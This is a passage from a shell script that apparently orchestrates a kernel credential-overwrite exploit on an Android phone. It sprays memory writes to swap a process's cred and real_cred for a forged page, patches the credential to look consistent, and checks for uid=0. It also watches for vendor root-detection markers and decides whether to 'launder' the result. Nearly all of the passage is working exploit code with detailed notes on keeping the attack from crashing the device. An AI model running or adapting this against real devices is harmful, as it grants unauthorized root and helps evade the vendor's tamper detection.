    if shot_until 0x778 "V12_ALLOW_INIT_CRED=1 V12_W7_INIT_CRED=1" w778ctl "$ROUNDS"; then W778_LANDED=1; fi
    # Same value again for the second slot -- this is exactly cell 2.
    V778="V12_ALLOW_INIT_CRED=1 V12_W7_INIT_CRED=1"
    say "  [same-value] step 6 will reuse the init_cred image (cell-2 reproduction)"
else
    if shot_until 0x778 "" w778 "$ROUNDS"; then W778_LANDED=1; fi
    # ⚠ INVARIANT, do not break it silently: `tail -1` takes the LAST round's
    # write_value, which equals "the round that SUCCEEDED" only because
    # shot_until returns the moment the stamp appears (so a success is always the
    # final round).  If ROUNDS is ever changed to run to completion — or
    # shot_until stops returning early — this silently picks up a FAILED round's
    # value and step 6 then writes a different page while every log line still
    # says "same value".  Any such change must select the successful round
    # explicitly instead.
    V778="V12_W7_VALUE=$(sed -n 's/.*write_value *= *\(0x[0-9a-f]*\).*/\1/p' \
            "$OUT"/w7_w778*.txt 2>/dev/null | tail -1)"
    case "$V778" in
        *"V12_W7_VALUE=0x"*)
            say "  [same-value] step 6 will reuse $V778"
            say "               (pointer identity follows by construction; content"
            say "                agreement alone can NEVER prove it -- see below)" ;;
        *)  V778=""
            say "  ⚠ [same-value] could NOT recover step 5's write value."
            say "    Firing step 6 now would spray a SECOND, DIFFERENT page and leave"
            say "    real_cred != cred -- a latent hard BUG_ON.  Refusing."
            say "    Re-run with ROUNDS>=1 and check $OUT/w7_w778*.txt, or set"
            say "    EXTRA=V12_W7_VALUE=0x... explicitly, or SAME_VALUE=0 to force it." ;;
    esac
fi
U778=$(uid_line "$CPID")
G778=$(gid_line "$CPID")
say "  after 0x778: [$U778] / [$G778]"
# ★ 断言，不是故事：0x778 落地必须能从 /proc/status 看到那枚戳。
# 而且必须在 step 7 的 repair 之前读 —— repair 把 cred+8 清零，证据就没了
# (notes.md §11 的 t5_repair.txt：repair 前第 4 个 awk 字段 = 4294967176，成功后 = 0)。
# ⚠ 这段曾经位于 `W778_LANDED = 1` 这个由 $3 差一错误挡住、**永远不可达**的分支里 ——
#   断言写在了只有判据正确时才会执行的位置，等于没写。判据修好后它才真正跑起来。
STAMP_VERIFIED=0
if [ "$W778_LANDED" = "1" ]; then
    WT778=$(sed -n 's/.*write_target= *\(0x[0-9a-f]*\).*/\1/p' "$OUT"/w7_w778*.txt 2>/dev/null | tail -1)
    stamp_ok "$CPID" "$WT778"; rc=$?
    case $rc in
    0)  say "  [stamp] ASSERTION HOLDS: Uid \$4 = $(( WT778 >> 32 & 0xffffffff )), Gid \$2 = $(( WT778 & 0xffffffff ))"
        STAMP_VERIFIED=1;;
    2)  say "  ⛔ [stamp] UNREADABLE at assertion time — landing UNKNOWN, not 'no'."
        say "     (device gone?) Do not launder on this run.";;
    *)  say "  ⚠ [stamp] ASSERTION FAILED: the criterion said landed earlier, the"
        say "    readback disagrees NOW. The stamp model or the side-effect offset is"
        say "    wrong for this path (notes.md §11 measured +8; +0x10 would stamp"
        say "    sgid/euid). ⛔ Do NOT launder on this run.";;
    esac
else
    if [ "${SHOT_PS:-}" = "D" ]; then
        say "  ⛔ [stamp] ORACLE INCONSISTENT: no stamp, but probe_state=D.  Go check"
        say "     the CRITERION before concluding the shot missed."
    else
        say "  [stamp] no stamp — 0x778 did not land. probe_state was ${SHOT_PS:-?},"
        say "          which is NOT the criterion."
    fi
fi

say "=== step 6: 0x780 shot(s) (cred) ==="
CRED=""
if [ -z "$V778" ] && [ "${SAME_VALUE:-1}" != "0" ]; then
    say "  ✗ step 6 SKIPPED (no same-value guarantee — see above)"
elif [ "$W778_LANDED" != "1" ] && [ "${SAME_VALUE:-1}" != "0" ]; then
    say "  ✗ step 6 SKIPPED: 0x778 did NOT land, so there is nothing to make equal."
    say "    A lone 0x780 landing leaves real_cred != cred — a divergent pair, i.e. a"
    say "    latent hard BUG_ON — and buys nothing.  Not fired."
    say "    (Set ROUNDS>1 to retry 0x778 within this boot: the stamp criterion is"
    say "     what makes a retry meaningful, since a failed round is now readable.)"
elif shot_until 0x780 "$V778" w780 "$ROUNDS"; then
    say "  after 0x780: [$(uid_line "$CPID")]"
    CRED=$(grep -h -m1 'write value = private cred page' "$OUT"/w7_w780*.txt 2>/dev/null \
           | sed -n 's/.*page \(0x[0-9a-f]*\).*/\1/p' | tail -1)
else
    say "  ✗ 0x780 did not move the readback — SKIPPING the repair."
    say "    The repair only exists to clear cred+8 of the cred that was actually"
    say "    installed; with nothing installed it repairs a page nobody points at."
    say "    (Run 7 burned 86 s on exactly that.)"
fi

V5=$(sed -n 's/.*write_value *= *\(0x[0-9a-f]*\).*/\1/p' "$OUT"/w7_w778*.txt 2>/dev/null | tail -1)
if [ -n "$CRED" ]; then
    # ★ 一次 boot 只修一个页。SAME_VALUE=1 时两枪同值 ⇒ 只有一张页被装上，一次
    # repair 就够。若两枪值不同，两张页的 +8 都会被清零 ⇒ 那枚戳（gid/suid）被
    # 抹掉 ⇒ 内容层会变成"一致"，假一致就真的过关了。所以这里断言两者相等。
    if [ "${SAME_VALUE:-1}" != "0" ] && [ -z "$V5" ]; then
        # ⛔ The case the old check could not see.  It required [ -n "$V5" ] to warn
        # at all, so it stayed silent precisely when the news was worst: step 6
        # landed a page and step 5 never did, i.e. a LONE 0x780 write.  real_cred
        # still points at the original cred while cred points at a sprayed page --
        # a divergent pair, a latent hard BUG_ON, and it buys nothing.  Empty V5 is
        # not "no news", it is the worst news.
        say "  ⛔ WORSE CASE: step 6 landed a page but step 5 never landed (step5=none)."
        say "     A LONE 0x780 write: real_cred != cred -- a divergent pair and a"
        say "     latent hard BUG_ON, with no upside.  Repairing here clears cred+8 of"
        say "     a page the task does point at, so do it only to tidy the stamp, and"
        say "     ⛔ do NOT launder on this run."
    elif [ "${SAME_VALUE:-1}" != "0" ] && [ "$CRED" != "$V5" ]; then
        say "  ⚠ step 6 wrote a DIFFERENT page than step 5 (step6=$CRED step5=$V5)."
        say "    The same-value guarantee did NOT hold.  Do not repair both pages:"
        say "    zeroing cred+8 on both would erase the gid/suid stamp and manufacture"
        say "    a false 'consistent'.  Repairing only the installed page and stopping."
        say "    ⛔ Do NOT launder on this run."
    fi
    say "=== step 7: ONE local repair of cred+8 (cred=$CRED) ==="
    shot 0x780 "V12_W7_ZERO=1 V12_W7_REPAIR_CRED=1 V12_W7_REPAIR_ADDR=$CRED" repair >/dev/null
    alive || { say "  !! DEVICE GONE after the repair shot"; exit 5; }
    same_boot || { say "  !! REBOOTED after the repair shot"; exit 6; }
    say "  after repair: [$(uid_line "$CPID")]"
fi

# ★★★ Write the same-value FACT for the LT child to read at launder time.
# Its environment was fixed at step 4; only now do we know whether the two shots
# actually wrote one value.  Fail closed: anything other than the full conjunction
# writes 0, so a partially-successful boot can never talk itself into laundering.
SV=0
if [ "${SAME_VALUE:-1}" != "0" ] \
   && [ "$W778_LANDED" = "1" ] \
   && [ -n "$V778" ] \
   && [ -n "$CRED" ] \
   && [ "$CRED" = "$V5" ]; then
    SV=1
fi
A "echo $SV > $SV_FILE" >/dev/null 2>&1
say "  [same-value FACT] $SV_FILE = $SV"
if [ "$SV" = "1" ]; then
    say "    0x778 landed, and step 6 wrote the same value as step 5."
else
    say "    ⛔ the guarantee is NOT held (0x778_landed=$W778_LANDED, step6=${CRED:-none},"
    say "       step5=${V5:-none}).  V12_LAUNDER will refuse on this run — by design."
fi

say "=== step 8: poke LT parent (BEFORE the verdict, so its own report counts) ==="
[ -n "$PPID_LT" ] && A "kill -USR1 $PPID_LT" 2>&1 | tr -d '\r'
# ★ cred.stream starts HERE, not after step 9's watch.
# The poke releases the child into its NO_EXEC report loop, which is
# 240 x 0.5 s = 120 s and then _exit(0) (exploit.c: "LT child NO-EXEC mode
# done (120s)").  The old placement was after the watch — WATCH=120 default,
# i.e. t+~135 s including the report wait — by which time the child is already
# gone, so the instrument captured nothing at exactly the window it exists for
# (the first seconds after the landing).  uid.stream was already started before
# the shots; this makes the two symmetric: both streams are up before the thing
# they measure begins.
say "  starting cred.stream on $RES (before the verdict, so it covers the poke window)"
cred_stream_start "$OUT/cred.stream"
for i in $(seq 1 15); do
    sleep 1
    R=$(A "cat $RES 2>/dev/null" | tr -d '\r' | tail -1)
    [ -n "$R" ] && { say "  child report: $R"; break; }
done

say "=== verdict ==="
UREP=$(uid_line "$CPID")
RPT=$(A "cat $RES 2>/dev/null | tail -1" | tr -d '\r')
say "  /proc/$CPID/status Uid: [$UREP]"
say "  child's own report:     [$RPT]"
case "$UREP$RPT" in
  *"0 0 0 0"*|*"uid=0"*|*noexec*) say "  ★ CRED TOOK — this boot answered the Boot A question.";;
  *) say "  ✗ cred did not take in this boot.  Take a fresh boot; do not add rounds.";;
esac

say "=== step 9: watch ${WATCH}s ==="
for i in $(seq 5 5 "$WATCH"); do
    sleep 5
    UP=$(A 'cut -d. -f1 /proc/uptime' | tr -d '\r')
    [ -z "$UP" ] && { say "  !! device gone at t+${i}s — REBOOT"; break; }
    say "  t+${i}s up=$UP services=$(svc_count)/5"
done

say "  cred.stream started at the poke (see step 8) — stopping streams now"
streams_stop
say "=== step 10: evidence ==="
stop_klog
say "  klog.host: $(wc -l < "$KLOG") lines, $(sort -u "$KLOG" 2>/dev/null | wc -l) unique"
say "  --- reboot / watchdog markers (NOT ROOTCHECK) ---"
if grep -anE 'sys_reboot|reboot: |Restarting system|hung_task|softlockup|soft lockup|Unable to handle|Call trace|BUG:|timestamps went backwards' \
        "$KLOG" | tail -30 > "$OUT/10_reboot_markers.txt"; then
    sed 's/^/    /' "$OUT/10_reboot_markers.txt"
else
    say "    (none)"
fi
say "  --- guard markers ---"
grep -aE 'ROOTCHECK|oplus_root|sys_call_number|path@@|execve_' "$KLOG" | tail -20 > "$OUT/10_rootcheck.txt"
if [ -s "$OUT/10_rootcheck.txt" ]; then sed 's/^/    /' "$OUT/10_rootcheck.txt"; else say "    (none)"; fi
A "getprop ro.boot.bootreason; getenforce; uptime; grep -c '^kernelsu' /proc/modules 2>/dev/null" | tee "$OUT/10_final.txt"
for f in bootA_lt_$TAG.log bootA_lt_ev_$TAG.txt; do
    A "cat $DEV/$f 2>/dev/null" | tr -d '\r' > "$OUT/$f"
done
say "evidence -> $OUT"
say "=== done ==="
